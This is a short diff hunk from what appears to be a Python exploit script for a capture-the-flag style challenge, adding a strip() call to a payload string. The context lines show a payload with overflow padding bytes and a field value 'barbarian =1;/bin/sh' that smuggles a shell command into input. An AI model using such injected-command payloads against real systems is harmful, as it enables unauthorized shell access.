@@ -38,6 +38,7 @@ change BAAAAAAAAAAAAAAAAAAAAAAA\x01\x01 ''' + "Z"*(0x20) + '''
 new barbarian =1;/bin/sh
 print all
 '''
+stage1 = stage1.strip()
 
 def sendcommand(com):
 	sleep(0.1)
